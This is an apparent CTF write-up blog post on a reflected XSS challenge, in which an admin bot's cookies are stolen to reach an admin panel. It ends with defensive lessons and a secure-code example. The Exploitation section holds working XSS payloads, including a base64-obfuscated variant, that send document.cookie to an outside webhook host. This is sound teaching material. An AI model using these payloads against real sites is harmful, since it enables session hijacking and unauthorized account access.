---
layout: post
title: "Reflected XSS - Cookie Stealer"
date: 2025-12-20
category: web
tags: [xss, javascript, cookies]
---

Exploiting reflected XSS vulnerability to steal admin cookies and gain unauthorized access.

## Challenge Overview

**Challenge Name:** Cookie Monster  
**Difficulty:** Medium  
**Points:** 200  
**Category:** Web Exploitation

A search functionality that reflects user input without proper sanitization, leading to XSS vulnerability.

## Enumeration / Recon

The application features a search bar that displays results with the query reflected in the page:

```html
<h2>Search results for: [USER INPUT]</h2>
```

Testing basic payloads:
- `<script>alert(1)</script>` - Blocked by filter
- `<img src=x onerror=alert(1)>` - Blocked by filter
- URL encoding attempts - Partially filtered

The filter appears to block common tags but doesn't handle all encoding methods.

## Vulnerability Analysis / Findings

Discovered the application:
1. Reflects search queries in HTML without encoding
2. Implements basic XSS filter (blacklist-based)
3. Uses cookies for session management
4. Admin bot visits reported URLs

Filter weaknesses identified:
- Case sensitivity issues
- Doesn't handle event handlers properly
- No Content Security Policy (CSP)

## Exploitation / Solution

Crafted payload to bypass the filter using SVG and various encoding:

```html
<svg/onload=fetch('https://webhook.site/xxx?c='+document.cookie)>
```

Alternative payload that worked:

```html
<img src=x onerror="eval(atob('ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlL3h4eD9jPScrZG9jdW1lbnQuY29va2llKQ=='))">
```

Steps:
1. Set up webhook to capture cookies
2. Submit malicious URL to admin bot
3. Admin bot visits the link
4. JavaScript executes and sends cookies to webhook
5. Captured admin session cookie
6. Used cookie to access admin panel

Retrieved flag from admin dashboard.

## Flag

```
Flag{r3fl3ct3d_xss_c00k13_th3ft}
```

## Lessons Learned

1. **Output encoding** - Always encode user input before displaying in HTML
2. **CSP implementation** - Content Security Policy prevents inline scripts
3. **HTTPOnly cookies** - Prevents JavaScript from accessing sensitive cookies
4. **Whitelist approach** - Use whitelist instead of blacklist for input validation
5. **Security headers** - X-XSS-Protection, X-Frame-Options headers provide additional protection

### Secure Implementation

```javascript
// Vulnerable code
document.getElementById('results').innerHTML = `Search results for: ${query}`;

// Secure code
const sanitized = DOMPurify.sanitize(query);
document.getElementById('results').textContent = `Search results for: ${sanitized}`;
```

Additionally, set cookies with security flags:

```
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
```
